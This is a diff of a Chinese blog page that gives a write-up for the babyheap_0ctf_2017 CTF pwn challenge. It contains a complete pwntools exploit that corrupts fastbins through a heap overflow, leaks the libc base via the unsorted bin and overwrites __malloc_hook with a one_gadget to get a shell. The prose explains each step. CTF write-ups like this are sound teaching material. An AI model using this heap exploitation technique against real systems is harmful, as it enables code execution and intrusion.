@@ -4,7 +4,11 @@
   <meta charset="utf-8">
   
   
-  <meta name="description" content="先贴源码" />
+  <meta name="description" content="前言：如果按照buu的pwn题排序，这题虽然是堆的入门题，但是难度较之前无脑ROP的一堆栈题难度上升还是挺大的，阅读本文需要一定的对于chunk的基础。因为我个人在做题的时候，刚开始碰到那些alloc来free掉的有些不懂为什么要这样，找的博客也很少有说大概思路的，所以我就想把细致的思路用文字描述一下，然后我有点懒，也懒得再动手调一遍了，更懒得放图，所以放两个参考博客，都是我认为写的比较详细的博客，思路其实是一样的，payload稍微有点偏差，大家可以去看看，说不定你们就不想看我的博客了（::&amp;gt;_&amp;lt;::），然后就是这样吧，还是想强调一下本文多文字思路，几乎无图。因为懒，所以想要真正看懂这题还是要去多看看我下面放的这两个参考博客吧。
+也不要说我没用，我怎么说也帮你在一堆讲的不太行的wp里放出了两个还行的。
+总的来说博客2更详细一点，稍微更推荐博客2一点，博客1在malloc_hook那边动手调了一下，各有所长吧，肯定比大部分要搜到的奇怪wp要好很多。
+参考博客1：http://pearcechn.top/2021/02/02/%E3%80%90writeup%E3%80%91buuctf-pwnheap_1/
+参考博客2：https://blog.csdn.net/xieyichensss/article/details/116071092" />
   
 
   
@@ -15,16 +19,17 @@
   
   <title>babyheap_0ctf_2017-wp | refrain的blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="先贴源码">
+  <meta name="description" content="前言：如果按照buu的pwn题排序，这题虽然是堆的入门题，但是难度较之前无脑ROP的一堆栈题难度上升还是挺大的，阅读本文需要一定的对于chunk的基础。因为我个人在做题的时候，刚开始碰到那些alloc来free掉的有些不懂为什么要这样，找的博客也很少有说大概思路的，所以我就想把细致的思路用文字描述一下，然后我有点懒，也懒得再动手调一遍了，更懒得放图，所以放两个参考博客，都是我认为写的比较详细的博">
 <meta property="og:type" content="article">
 <meta property="og:title" content="babyheap_0ctf_2017-wp">
 <meta property="og:url" content="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/index.html">
 <meta property="og:site_name" content="refrain的blog">
-<meta property="og:description" content="先贴源码">
+<meta property="og:description" content="前言：如果按照buu的pwn题排序，这题虽然是堆的入门题，但是难度较之前无脑ROP的一堆栈题难度上升还是挺大的，阅读本文需要一定的对于chunk的基础。因为我个人在做题的时候，刚开始碰到那些alloc来free掉的有些不懂为什么要这样，找的博客也很少有说大概思路的，所以我就想把细致的思路用文字描述一下，然后我有点懒，也懒得再动手调一遍了，更懒得放图，所以放两个参考博客，都是我认为写的比较详细的博">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/1.png">
+<meta property="og:image" content="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/2.png">
 <meta property="article:published_time" content="2021-09-21T15:45:03.000Z">
-<meta property="article:modified_time" content="2021-09-22T05:50:33.612Z">
+<meta property="article:modified_time" content="2021-09-22T07:32:38.526Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/1.png">
@@ -85,28 +90,44 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/" data-id="cktv38dsy00023kvkgnjt8edz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/" data-id="cktv6vicn0001q0vk6asd93hk" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <p>先贴源码</p>
+        <p> 前言：如果按照buu的pwn题排序，这题虽然是堆的入门题，但是难度较之前无脑ROP的一堆栈题难度上升还是挺大的，阅读本文需要一定的对于chunk的基础。因为我个人在做题的时候，刚开始碰到那些alloc来free掉的有些不懂为什么要这样，找的博客也很少有说大概思路的，所以我就想把细致的思路用文字描述一下，然后我有点懒，也懒得再动手调一遍了，更懒得放图，所以放两个参考博客，都是我认为写的比较详细的博客，思路其实是一样的，payload稍微有点偏差，大家可以去看看，说不定你们就不想看我的博客了（::&gt;_&lt;::），然后就是这样吧，还是想强调一下本文多文字思路，几乎无图。因为懒，所以想要真正看懂这题还是要去多看看我下面放的这两个参考博客吧。</p>
+<p>也不要说我没用，我怎么说也帮你在一堆讲的不太行的wp里放出了两个还行的。</p>
+<p>总的来说博客2更详细一点，稍微更推荐博客2一点，博客1在malloc_hook那边动手调了一下，各有所长吧，肯定比大部分要搜到的奇怪wp要好很多。</p>
+<p>参考博客1：<a target="_blank" rel="noopener" href="http://pearcechn.top/2021/02/02/[writeup]buuctf-pwnheap_1/">http://pearcechn.top/2021/02/02/%E3%80%90writeup%E3%80%91buuctf-pwnheap_1/</a></p>
+<p>参考博客2：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xieyichensss/article/details/116071092">https://blog.csdn.net/xieyichensss/article/details/116071092</a></p>
 <span id="more"></span>
 
-<h1 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h1><p>from pwn import *<br>#context.log_level = “debug”<br>p = remote(‘node4.buuoj.cn’,26841)<br>#p = process(‘./babyheap_0ctf_2017’)<br>elf = ELF(‘./babyheap_0ctf_2017’)<br>one_gadget = 0x4526a<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’, checksec=False)<br>libc = ELF(‘./libc-2.23-buu.so’)<br>def alloc(size):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’1’)<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(size))<br>def fill(idx,content):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’2’)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(len(content)))<br>    p.recvuntil(b”Content: “)<br>    p.send(content)<br>def free(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’3’)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>def dump(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”4”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvline()<br>    return p.recvline()</p>
+<h1 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h1><p>from pwn import *<br>#context.log_level = “debug”<br>p = remote(‘node4.buuoj.cn’,26841)<br>#p = process(‘./babyheap_0ctf_2017’)<br>elf = ELF(‘./babyheap_0ctf_2017’)<br>one_gadget = 0x4526a<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’, checksec=False)<br>libc = ELF(‘./libc-2.23-buu.so’)<br>def alloc(size):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”1”)<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(size))<br>def fill(idx,content):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”2”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(len(content)))<br>    p.recvuntil(b”Content: “)<br>    p.send(content)<br>def free(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’3’)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>def dump(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”4”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvline()<br>    return p.recvline()</p>
 <p>alloc(0x10)<br>alloc(0x10)<br>alloc(0x10)<br>alloc(0x10)<br>alloc(0x80)</p>
 <p>free(1)<br>free(2)</p>
-<p>#gdb.attach(p)<br>payload = p64(0)*3<br>payload += p64(0x21)<br>payload += p64(0)*3<br>payload += p64(0x21)<br>payload += p8(0x80)<br>fill(0,payload)<br>#gdb.attach(p)<br>payload = p64(0) * 3<br>payload += p64(0x21)<br>fill(3,payload)<br>alloc(0x10)<br>alloc(0x10)<br>payload = p64(0)*3<br>payload += p64(0x91)<br>fill(3,payload)<br>alloc(0x80)<br>free(4)<br>dump(2)<br>#libc_base = u64(p.recv(6).ljust(8, b”\x00”))-0x3c4b78<br>libc_base = u64(dump(2)[:8].strip().ljust(8, b”\x00”))-0x3c4b78<br>success(‘libc_base =’ +hex(libc_base))<br>alloc(0x60)<br>free(4)<br>payload = p64(libc_base+0x3c4aed)<br>fill(2,payload)<br>alloc(0x60)<br>alloc(0x60)#fakechunk<br>payload = p8(0)*3+p64(0)*2<br>payload += p64(libc_base+one_gadget)<br>fill(6,payload)<br>#gdb.attach(p)<br>alloc(0x255)</p>
+<p>#gdb.attach(p)<br>payload = p64(0)*3<br>payload += p64(0x21)<br>payload += p64(0)*3<br>payload += p64(0x21)<br>payload += p8(0x80)<br>fill(0,payload)<br>#gdb.attach(p)<br>payload = p64(0)*3<br>payload += p64(0x21)<br>fill(3,payload)<br>alloc(0x10)<br>alloc(0x10)<br>payload = p64(0)*3<br>payload += p64(0x91)<br>fill(3,payload)<br>alloc(0x80)<br>free(4)</p>
+<p>libc_base = u64(dump(2)[:8].strip().ljust(8, b”\x00”))-0x3c4b78#0x3c4b20+0x58=0x3cb78<br>success(‘libc_base =’ +hex(libc_base))<br>alloc(0x60)<br>free(4)<br>payload = p64(libc_base+0x3c4aed)<br>fill(2,payload)<br>alloc(0x60)<br>alloc(0x60)#fakechunk<br>payload = p8(0)*3+p64(0)*2<br>payload += p64(libc_base+one_gadget)<br>fill(6,payload)<br>#gdb.attach(p)<br>alloc(0x255)</p>
 <p>p.interactive()</p>
-<p>直接复制粘贴的话，首先远程的话去buu下了他的libc放到同一个文件夹里肯定是能跑的，本地跑不了别找我。</p>
+<p>直接复制粘贴的话，首先远程的话去buu下了他的libc放到同一个文件夹里肯定是能跑的，如果本地跑不了因为环境等等因素很多，不要来问我为什么，我也不清楚。</p>
 <p>其次这一题的话要注意使用的libc版本，我是直接用16的ubuntu做的</p>
-<h1 id="2-思路"><a href="#2-思路" class="headerlink" title="2.思路"></a>2.思路</h1><p>说思路之前先说一下这篇wp不会讲到特别多的基础知识点，所以如果连chunk和bin的数据结构都不知道的萌新可以走了…</p>
-<p>建议你们百度一下ctfwiki至少先知道chunk和fastbin unsortedbin的数据结构再来学习这篇wp，pwn的学习之路个人认为要扎实，埋头刷题是很心浮气躁的行为。</p>
-<p>如果你学到堆题，却连chunk的数据结构都不清楚，这个时候应该回过头好好打个怪练个级再来了</p>
-<p>不过最近手上刚好有个图，发出来给大伙儿看看，chunk的话大概也就这样了</p>
-<p>首先是head</p>
+<h1 id="2-一点点基础知识"><a href="#2-一点点基础知识" class="headerlink" title="2.一点点基础知识"></a>2.一点点基础知识</h1><p>说思路之前先说一下这篇wp不会讲到特别多的基础知识点</p>
+<p>如果你学到堆题，却连chunk的数据结构都不清楚，我个人也不是很推荐你继续埋头刷题了。</p>
+<p>然后有些人可能不知道去哪里学习这些堆的基础内容，我个人的建议是ctfwiki有一个较为完整的框架，可以去看看，但观感就像老师纯念ppt一样，堆一些新手可能不是很友好，所以b站直接搜pwn其实也有不少讲的还行的培训，两者搭配起来，只论底层原理的话感觉也不算很难，应该很容易就可以搞定了。</p>
+<p>不过最近刚好在看glibc内存管理，手上刚好有个图，发出来给大伙儿看看，侵删，大概是这样，我就不做多的讲解了，细节性的东西自己去研究吧。</p>
 <p><img src="/2021/09/21/babyheap-0ctf-2017-wp/1.png" alt="1"></p>
+<p><img src="/2021/09/21/babyheap-0ctf-2017-wp/2.png" alt="2"></p>
+<p>chunk大概就是这样，如果没有基础看起来肯定也很复杂，但还是那句话这也不该是我在wp里慢慢告诉你的东西，然后就是ubuntu16采用的还是fastbin而不是tache，这题也是主要利用fastbin进行攻击的。这部分内容感觉内存管理这个pdf里讲的就不算特别详细了，如果不明白的就在我刚刚说的那几种学习方式去自己学吧。</p>
+<p>ida的逆向过程我不是很想放…有点懒了,别的wp应该也讲了很多了，对着看看就好。</p>
+<h1 id="3-总体思路"><a href="#3-总体思路" class="headerlink" title="3.总体思路"></a>3.总体思路</h1><p>首先想说的是，buu的刷题路线感觉很陡峭，如果刚从栈题切换到堆题，可能会很迷茫，因为在栈题里面，我们一般就盯着ret address把他劫持了就行了…但是在堆题里，哪怕了解了chunk的结构，我们也有点无从下手，不知道该如何利用，这里先不多说，我反正当时这个想法很强烈，在题目里感悟就好</p>
+<p>到这里，我们终于可以开始讲这题的思路了，总体思路是泄露libc基址，这样我们可以获得malloc_hook的地址，然后更改malloc_hook，把一个one_gadget放进去，这样调用malloc_hook的时候就会变成调用one_gadget从而控制程序执行流。</p>
+<p>可能会有人去问malooc_hook是什么，我的建议是baidu or google</p>
+<p>然后再细化一点</p>
+<p>我们最开始在前面alloc来free去，目的其实就是为了获得指向同一个0x80堆块的两个指针，获得双指针这也是double free 与uaf的思想，个人认为也是堆题里面很重要的一个思想，为什么需要指向同一个堆块里的两个指针呢？这个的话要具体情况具体分析，比如在本题，我们需要获得libc_base从而获得malloc_hook,需要用到unsorted bin里的一个特性，当unsorted bin里只有一个chunk时，这个chunk的fd和bk指针将会指向main_arena+0x58,而main_arena又与libc_base有固定偏移，至少在ubuntu16里偏移应该是0x3c4b20。于是我们知道了固定偏移减去就可以得到libc_base，但是说起来很简单的一个事情，想要实现的关键是什么呢？那就是读取放入unsortedbin的那个chunk的bk指针，那么我们从ida的逆向分析中可以得知，被free放入各种bin中的chunk是无法被dump（打印功能）的，但是如果我们此时拥有一个双指针，一个指针被free了，但是另外一个并没有，对于这个指针来说，他就可以直接把fd指针dump出来。</p>
+<p>然后这题获得指向0x80的两个指针的方法是什么呢？我们alloc(0x10)四次，依次为chunk 0 1 2 3 然后alloc(0x80)，为chunk 4，然后这个时候我们把1和2free了，1和2free以后会进入fastbin，至于为什么要扔进fastbin，因为相较于其他bin单链表结构会很方便处理，也没有unlink检测什么的，然后我们通过修改chunk 2的fd指向chunk 4，如何修改chunk 2呢，被free的chunk也是不能用fill修改的！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！但是我们的fill函数是没有越界检查的！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！这也是本题最大的漏洞，于是我们就fill(0,payload)从chunk0一点点溢出到chunk2并且改了他的fd（至于payload的构成和chunk数据结构有关，在此不多赘述，可以自己用gdb调一调），并且fastbin也是有检测的，我们需要将chunk4的size位改小，因为fastbin是有限制的，所以就有了fill（3，payload）这一步，这里我们改的是0x21，然后fastbin是和堆一样先进后出的，所以后进的chunk2会被第一个调用，然后会去看chunk2的fd指针，就等于把chunk 4 也放进了fastbin，于是这个时候我们再alloc两次，第一次把chunk2放在了chunk1的位置，第二次把chunk4放在了chunk2的位置，于是这个时候我们的chunk2和chunk4都指向了chunk4，这里我们需要注意总结的是什么呢，我们的chunk4是从来没有被真正放入fastbin中的，只是fastbin以为里面chunk4进去了，所以才会造成这样的后果，简单来说就是我们做了这么多都是在欺骗fastbin。那么这个时候我们再把chunk4free掉，chunk4就被扔进unsortedbin（如果不知道啥时候进什么bin也是要自己去学学的）然后这个时候chunk4的指针已经不能dump了，但我们还有chunk2的指针，于是我们通过dump（2）并且稍微处理下数据并接收，顺利获得main_arena，下面也就顺利获得了libc_base和malloc_hook</p>
+<p>然后这个时候我们就可以开始攻击了，这里我也懒得放图了，自己可以去看看我放的两个参考博客的图文都很详细，大概构造思路就是我们来到malloc_hook-0x23的位置，因为这里附近有一个单独的7f这个数据，可以构造为我们的size位。于是我们还是老手法，通过修改fd指针，构造出一个在malloc_hook-0x23的fakechunk，然后因为隔了0x23，把内存对齐到malloc_hook处把one_gadget扔进去就行。</p>
+<p>总结一下思路就是，扔进fastbin里然后改fd改size，从而制造出各种fakechunk来实现我们的最终目的。</p>
+<p>最后还是想说因为我懒并且觉得也没啥人看我博客，所以我就纯当自己梳理思路了，真正想看懂这题肯定还是离不开我开头的两篇参考博客。也不要说我毫无作用吧，至少我帮你们在一堆看不懂的wp里面找了两个稍微能看懂的。</p>
 
       
     </div><!-- .entry-content -->
